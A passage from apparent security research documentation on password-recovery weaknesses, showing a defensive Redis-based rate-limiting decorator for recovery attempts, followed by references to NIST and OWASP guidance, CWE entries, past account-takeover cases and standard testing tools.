    """Rate limit recovery attempts"""
    def decorator(func):
        @wraps(func)
        def wrapper(email, *args, **kwargs):
            key = f"recovery:{email}"
            attempts = redis_client.incr(key)

            if attempts == 1:
                redis_client.expire(key, window)

            if attempts > max_attempts:
                # Log suspicious activity
                log_suspicious_recovery(email, attempts)
                raise RateLimitExceeded("Too many recovery attempts")

            return func(email, *args, **kwargs)
        return wrapper
    return decorator

def log_suspicious_recovery(email, attempts):
    """Log and alert on suspicious recovery patterns"""
    # Log to SIEM
    # Send alert to security team
    # Optionally lock account temporarily
    pass
```

---

## 5. References and Resources

### 5.1 Security Standards
- NIST SP 800-63B: Digital Identity Guidelines
- OWASP Authentication Cheat Sheet
- OWASP Forgot Password Cheat Sheet

### 5.2 CWE References
- CWE-640: Weak Password Recovery Mechanism
- CWE-620: Unverified Password Change
- CWE-287: Improper Authentication
- CWE-304: Missing Critical Step in Authentication

### 5.3 Real-World Case Studies
- Twitter account recovery bypass (2020)
- Facebook account takeover via trusted contacts (2019)
- Apple iCloud recovery exploits
- Various bug bounty reports on HackerOne/Bugcrowd

### 5.4 Tools
- Burp Suite Professional
- OWASP ZAP
- Nuclei
- ffuf
- Custom scripts (provided above)

---

*Document Version: 1.0*
*Last Updated: 2026-01-30*
*Classification: Security Research Documentation*
